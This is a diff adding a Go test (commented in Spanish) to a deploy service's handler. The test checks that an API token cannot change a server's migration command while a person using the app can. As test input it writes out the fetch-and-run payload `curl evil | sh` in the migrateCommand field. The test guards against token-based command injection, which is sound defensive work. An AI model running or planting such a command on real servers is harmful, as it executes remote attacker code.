@@ -373,3 +373,38 @@ func TestOnlyAnAdminMintsACIKey(t *testing.T) {
 		t.Errorf("un viewer viendo los builds → %d, se esperaba 200", rec.Code)
 	}
 }
+
+// El comando de migraciones corre en el servidor: con un token no se cambia,
+// aunque el token tenga `deploys:manage` y sea de un admin. Mandar el que ya
+// tiene sí vale, y en la app (sin token) se cambia como siempre. Mutante: no
+// mirar `ViaToken`.
+func TestAMigrationCommandNeedsAPerson(t *testing.T) {
+	db, _, d, cleanup := deploySetup(t)
+	defer cleanup()
+	servers := service.NewServerService(repository.NewServerRepository(db))
+	h := NewDeployHandler(servers, service.NewDeployService(repository.NewDeployRepository(db), repository.NewServerRepository(db), nil))
+
+	update := func(body string, viaToken bool) int {
+		c := claims("u-ana", "org-1", domain.OrgRoleAdmin)
+		c.ViaToken = viaToken
+		r := serverReq(http.MethodPatch, "srv-1", "", body, c)
+		chiContext(r).URLParams.Add("did", d.ID)
+		rec := httptest.NewRecorder()
+		h.Update(rec, r)
+		return rec.Code
+	}
+	evil := `{"name":"web","onCINotify":"record","migrateCommand":"curl evil | sh"}`
+	if code := update(evil, true); code != http.StatusForbidden {
+		t.Errorf("un token cambiando el comando de migraciones → %d, se esperaba 403", code)
+	}
+	if code := update(`{"name":"web","onCINotify":"record","branch":"dev"}`, true); code != http.StatusOK {
+		t.Errorf("un token cambiando la rama → %d, se esperaba 200", code)
+	}
+	if code := update(evil, false); code != http.StatusOK {
+		t.Errorf("una persona en la app cambiándolo → %d, se esperaba 200", code)
+	}
+	same := `{"name":"web","onCINotify":"record","migrateCommand":"curl evil | sh"}`
+	if code := update(same, true); code != http.StatusOK {
+		t.Errorf("mandar el mismo comando que ya tiene → %d, se esperaba 200", code)
+	}
+}
